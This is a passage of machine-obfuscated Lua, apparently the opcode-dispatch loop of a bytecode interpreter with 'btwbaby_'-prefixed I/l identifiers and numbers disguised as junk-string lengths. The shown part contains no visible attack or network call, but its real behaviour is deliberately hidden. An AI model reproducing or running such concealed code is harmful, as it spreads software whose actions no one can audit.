lIIIllII[#("lX")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("bSe")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xM")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("I6Z")];end;elseif btwbaby_IIlIllIIlIlIIlIIIl>#("pgyr2WxSx1DxXzkANpIDEkLmTlXooOK7sj1ZMF0")then local btwbaby_IIlIllIIlIlIIlIIIl;local btwbaby_lllIllIIlIlIlIllIIIIIIIII;local btwbaby_llIlIIIl,btwbaby_llIIIlIlllll;local btwbaby_lIIIlIIIIllllIlIllllI;local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CS")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5JX")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zg")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Mb6")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("xP")];btwbaby_lIIIlIIIIllllIlIllllI=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ooJ")]];btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]=btwbaby_lIIIlIIIIllllIlIllllI;btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_lIIIlIIIIllllIlIllllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mWCY")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ru")]btwbaby_llIlIIIl,btwbaby_llIIIlIlllll=btwbaby_lIllllllIIllIIlIll(btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]))btwbaby_lIlIIllIllIlIIlI=btwbaby_llIIIlIlllll+btwbaby_IIlIllIIlIlIIlIIIl-1 btwbaby_lllIllIIlIlIlIllIIIIIIIII=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_lIlIIllIllIlIIlI do btwbaby_lllIllIIlIlIlIllIIIIIIIII=btwbaby_lllIllIIlIlIlIllIIIIIIIII+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llIlIIIl[btwbaby_lllIllIIlIlIlIllIIIIIIIII];end;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("p2")]btwbaby_llIlIIIl={btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_lIlIIllIllIlIIlI))};btwbaby_lllIllIIlIlIlIllIIIIIIIII=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_IllIIIllIlIIIIIlIIIllII[#("zBmC")]do btwbaby_lllIllIIlIlIlIllIIIIIIIII=btwbaby_lllIllIIlIlIlIllIIIIIIIII+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llIlIIIl[btwbaby_lllIllIIlIlIlIllIIIIIIIII];end btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("XvK")];else local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("CE")]local btwbaby_IIIllIlIIlI,btwbaby_llIIllIll=btwbaby_lIllllllIIllIIlIll(btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII](btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII+1]))btwbaby_lIlIIllIllIlIIlI=btwbaby_llIIllIll+btwbaby_IllIIIllIlIIIIIlIIIllII-1 local btwbaby_llIIllIll=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_lIlIIllIllIlIIlI do btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];end;end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("Ufa9FRibgRjshp7fFkJQ9iDTqGeNHvXizXTyjLSbdVhI")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("qZcmWtB6jVMNqT9NFFU4b3uHJ53DINna5o9QbBUcvl")then if btwbaby_IIlIllIIlIlIIlIIIl==#("bhV32TyIpyOCxFGN1A8zHILRbTsMeVSIZOsAXcbTj")then local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2c")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("1XI")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("FKDg")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1c")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("KjK")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("UJID")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{933;123;457;873};{738;841;786;519};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("ARa")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ou4H")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{450;223;226;834};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("dpX")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("97a1")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hv")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("B3e")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1k")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("SlR")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("vTY1")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oI")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5yM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{447;85;509;441};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("UMf")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("iYO")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Uj")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("y3e")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bU")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("8vH")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mt1f")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0E")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("a9n")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("NIYI")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hL")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CKE")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("aF")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rTI")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("PWXL")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{560;761;839;792};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("fga")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("LK")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("IDR")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hz")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("LuY")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hn")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("MbM")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uF")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Zs1")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8Eb9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cG")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PVC")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Bk")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jMP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("215z")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1I")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("imz")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dq")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("p8P")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TT")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("32n")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hn")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("OTt")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{658;5;522;164};{68;590;687;822};}]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("k8y")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uT")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("76d")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BAvN")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QM")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2la")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("FF")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Pec")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("WWLB")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xG")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("XGP")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("De")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("6A9")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{334;419;735;784};"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("xtO")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("pT")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("fuS")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("KH")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("CWV")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gy")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("opm")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BRDP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("iA")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("iBH")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("QGxB")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2z")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{172;454;78;540};"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nkzy")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7S")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZsT")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nU")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("e5S")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("2RY6")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fx")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("8Uc")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{449;735;625;258};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("sg2")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3q")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("De2")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Es")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("t1Q")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TQ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("tDq")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vyCk")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{128;762;832;811};{461;575;28;846};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("35Q")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mml5")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tJ")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{254;791;31;534};{228;367;106;639};"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gv")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ML1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("3kx5")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("d9m")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("pF")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mJ3")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sL")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{441;637;91;861};"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wj")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("CUE")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("l5")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("MlY")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{730;979;991;406};"1 + 1 = 111";{849;175;938;621};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hn")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Pm2")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9P")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{981;786;385;405};{565;576;593;988};{544;623;595;763};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("xFEP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vj")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("8f4")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Oe")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mvY")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("L4")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Pkt")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("u8")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jo8")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{380;991;750;23};"1 + 1 = 